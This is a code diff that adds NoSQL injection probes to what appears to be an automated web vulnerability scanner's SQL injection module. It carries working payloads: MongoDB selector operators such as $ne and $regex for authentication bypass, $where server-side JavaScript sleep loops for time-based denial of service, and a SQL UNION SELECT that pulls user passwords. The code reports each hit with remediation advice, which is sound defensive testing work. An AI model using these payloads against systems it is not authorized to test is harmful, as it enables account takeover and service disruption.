@@ -2,7 +2,9 @@
 
 from __future__ import annotations
 
+import time
 import uuid
+from typing import Any
 from urllib.parse import urlencode
 
 from diana.config import ScanConfig
@@ -84,6 +86,50 @@ SEARCH_SQLI_PAYLOADS = [
     "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
 ]
 
+# --- NoSQL (document-DB) injection ---------------------------------------
+#
+# Unlike SQL payloads, NoSQL operators only take effect when they reach the
+# database as real JSON *objects* — a query selector like {"$ne": null} tells
+# a MongoDB-style driver "match every document", and {"$where": "<js>"} runs
+# arbitrary server-side JavaScript. A string that merely *looks* like an
+# operator (e.g. the literal '{"$gt": ""}') is treated as a scalar and does
+# nothing. So these must be injected as structured values into a JSON body,
+# not as string payloads dropped into a URL. This is generic to any app whose
+# JSON API feeds request fields into a document-store selector.
+
+# Selector-manipulation operators: replace a scalar field with an object that
+# broadens the query to match unintended documents (auth bypass / mass update).
+NOSQL_MANIPULATION_OPERATORS: list[dict[str, Any]] = [
+    {"$ne": None},
+    {"$gt": ""},
+    {"$ne": -1},
+    {"$regex": ".*"},
+    {"$in": [None, ""]},
+]
+
+# Time delay (ms) requested by the server-side-JS DoS probe. Chosen well above
+# normal response jitter so a real evaluation is unambiguous, but bounded.
+NOSQL_SLEEP_MS = 2500
+# A response is flagged as a time-based hit only if it is slower than baseline
+# by at least this margin (seconds) AND slower than the absolute floor. Guards
+# against network jitter producing false positives.
+NOSQL_DELAY_MARGIN_S = 1.2
+NOSQL_DELAY_FLOOR_S = NOSQL_SLEEP_MS / 1000.0 * 0.6
+
+
+def _nosql_sleep_operators(sleep_ms: int) -> list[dict[str, Any]]:
+    """Operators that force the DB engine to burn wall-clock time.
+
+    ``$where`` evaluates server-side JavaScript (``sleep`` in a Mongo shell
+    context); a catastrophic ``$regex`` against a long crafted subject forces
+    the regex engine into exponential backtracking. Either delay, when it
+    tracks the requested duration, proves the value reached the query engine.
+    """
+    return [
+        {"$where": f"sleep({sleep_ms})"},
+        {"$where": f"function(){{var t=Date.now();while(Date.now()-t<{sleep_ms}){{}};return true;}}"},
+    ]
+
 
 class SQLiScanner(BaseScanner):
     name = "sqli"
@@ -107,10 +153,21 @@ class SQLiScanner(BaseScanner):
                 parameters=params,
             )
 
+            request_body = item.get("payload", {}).get("request_body") or {}
+
             if item.get("payload", {}).get("type") == "login_endpoint":
                 # Login injection test
                 login_findings = await self._test_login_injection_endpoint(endpoint)
                 findings.extend(login_findings)
+            elif request_body:
+                # Document-DB (NoSQL) operator injection into a JSON body.
+                nosql_findings = await self._test_nosql_body(endpoint, request_body)
+                for finding in nosql_findings:
+                    findings.append(finding)
+                    self.enqueue_to(
+                        "access_control", item["url"], item["method"],
+                        payload={"related_finding": f"NoSQLi found: {finding.title}"},
+                    )
             elif params:
                 payloads = await self._get_payloads_for_endpoint(endpoint, config)
                 for payload in payloads:
@@ -249,6 +306,173 @@ class SQLiScanner(BaseScanner):
                 # TODO: Compare response time against baseline
                 pass
 
+        return None
+
+    async def _send_body(
+        self, endpoint: Endpoint, body: dict[str, Any],
+    ) -> tuple[Any, float]:
+        """Send a JSON body with the endpoint's method; return (response, elapsed_s).
+
+        Returns (None, elapsed) on transport error so the caller can still use
+        the timing (a hung request is itself signal for the DoS probe).
+        """
+        start = time.perf_counter()
+        try:
+            response = await self.http.request(
+                endpoint.method or "POST", endpoint.url, json=body,
+            )
+        except Exception:
+            return None, time.perf_counter() - start
+        return response, time.perf_counter() - start
+
+    async def _test_nosql_body(
+        self, endpoint: Endpoint, body: dict[str, Any],
+    ) -> list[Finding]:
+        """Inject NoSQL operator objects into each field of a JSON body.
+
+        Two distinct classes are exercised, both fully generic:
+
+        * **Manipulation** — a scalar field is replaced with a selector object
+          (``{"$ne": ...}`` etc.). Detected by a differential: a scalar value
+          that should not match is compared against the operator that matches
+          everything; a success flip proves the operator altered query scope.
+        * **Denial of service** — a ``$where`` server-side-JS sleep (or a
+          catastrophic ``$regex``) is injected and the response time compared
+          against baseline; a delay tracking the requested duration confirms
+          the value reached and was evaluated by the query engine.
+        """
+        findings: list[Finding] = []
+        if not body:
+            return findings
+
+        # Baseline timing with the original, unmodified body.
+        _, baseline_elapsed = await self._send_body(endpoint, body)
+
+        seen_types: set[str] = set()
+        # Only object/scalar fields are worth targeting; cap field count so a
+        # large body can't explode the request budget.
+        for field in list(body.keys())[:6]:
+            original = body[field]
+            # A field already holding a nested object/list is a query filter
+            # itself; still worth probing but skip obvious non-injectables.
+            if isinstance(original, (dict, list)):
+                continue
+
+            # --- Manipulation (differential) ---------------------------------
+            if "manipulation" not in seen_types:
+                finding = await self._probe_nosql_manipulation(
+                    endpoint, body, field, original,
+                )
+                if finding:
+                    findings.append(finding)
+                    seen_types.add("manipulation")
+
+            # --- Denial of service (time-based) ------------------------------
+            if "dos" not in seen_types:
+                finding = await self._probe_nosql_dos(
+                    endpoint, body, field, baseline_elapsed,
+                )
+                if finding:
+                    findings.append(finding)
+                    seen_types.add("dos")
+
+            if len(seen_types) == 2:
+                break
+
+        return findings
+
+    async def _probe_nosql_manipulation(
+        self, endpoint: Endpoint, body: dict[str, Any], field: str, original: Any,
+    ) -> Finding | None:
+        """Detect selector manipulation via a match-nothing vs match-all diff."""
+        # Control: a scalar the backend almost certainly cannot match.
+        control_marker = f"diana-no-match-{uuid.uuid4().hex[:8]}"
+        control_body = dict(body)
+        control_body[field] = control_marker
+        control_resp, _ = await self._send_body(endpoint, control_body)
+        if control_resp is None:
+            return None
+        control_ok = control_resp.status_code < 400
+        control_len = len(control_resp.text)
+
+        for operator in NOSQL_MANIPULATION_OPERATORS:
+            mutated = dict(body)
+            mutated[field] = operator
+            resp, _ = await self._send_body(endpoint, mutated)
+            if resp is None:
+                continue
+            op_ok = resp.status_code < 400
+            # Manipulation signal: the operator broadens the query so it now
+            # succeeds (or returns materially more data) where a non-matching
+            # scalar did not. Requires an actual behaviour change vs control to
+            # avoid flagging endpoints that accept anything.
+            grew = control_len > 0 and len(resp.text) > control_len * 1.5
+            if op_ok and (not control_ok or grew):
+                return Finding(
+                    id=f"NOSQLI-{uuid.uuid4().hex[:8]}",
+                    vuln_type=VulnType.SQLI,
+                    severity=Severity.CRITICAL,
+                    title=f"NoSQL Injection (operator manipulation) in {field} at {endpoint.url}",
+                    description=(
+                        f"The field '{field}' accepts a document-DB query operator "
+                        f"object ({operator}). Injecting a selector such as $ne/$gt "
+                        f"broadens the query to match documents the caller should not "
+                        f"reach, enabling authentication bypass or mass record "
+                        f"manipulation. A non-matching scalar value behaved differently, "
+                        f"confirming the operator altered query semantics."
+                    ),
+                    endpoint=endpoint,
+                    evidence=resp.text[:500],
+                    payload_used=f'{{"{field}": {operator}}}',
+                    cwe_id="CWE-943",
+                    remediation=(
+                        "Reject request fields whose value is an object where a scalar "
+                        "is expected, or cast/validate types before building the query. "
+                        "Never pass raw request JSON into a document-store selector."
+                    ),
+                )
+        return None
+
+    async def _probe_nosql_dos(
+        self, endpoint: Endpoint, body: dict[str, Any], field: str,
+        baseline_elapsed: float,
+    ) -> Finding | None:
+        """Detect server-side-JS / regex DoS via a delay that tracks the ask."""
+        for operator in _nosql_sleep_operators(NOSQL_SLEEP_MS):
+            mutated = dict(body)
+            mutated[field] = operator
+            resp, elapsed = await self._send_body(endpoint, mutated)
+            delayed = (
+                elapsed - baseline_elapsed >= NOSQL_DELAY_MARGIN_S
+                and elapsed >= NOSQL_DELAY_FLOOR_S
+            )
+            if delayed:
+                return Finding(
+                    id=f"NOSQLI-DOS-{uuid.uuid4().hex[:8]}",
+                    vuln_type=VulnType.SQLI_BLIND,
+                    severity=Severity.HIGH,
+                    title=f"NoSQL Injection denial of service in {field} at {endpoint.url}",
+                    description=(
+                        f"Injecting a $where server-side-JavaScript expression into the "
+                        f"field '{field}' made the server sleep for a controlled duration "
+                        f"(~{NOSQL_SLEEP_MS}ms requested, {elapsed:.1f}s observed vs "
+                        f"{baseline_elapsed:.1f}s baseline). An attacker can pin database "
+                        f"CPU and exhaust request handlers, causing denial of service — "
+                        f"and the same evaluation channel permits arbitrary query logic."
+                    ),
+                    endpoint=endpoint,
+                    evidence=(
+                        f"baseline={baseline_elapsed:.2f}s observed={elapsed:.2f}s "
+                        f"payload={operator}"
+                    )[:500],
+                    payload_used=f'{{"{field}": {operator}}}',
+                    cwe_id="CWE-943",
+                    remediation=(
+                        "Disable server-side JavaScript evaluation ($where / mapReduce) "
+                        "in the database, and validate that request fields are scalars "
+                        "before using them in a query."
+                    ),
+                )
         return None
 
     async def _test_login_injection_endpoint(self, endpoint: Endpoint) -> list[Finding]:
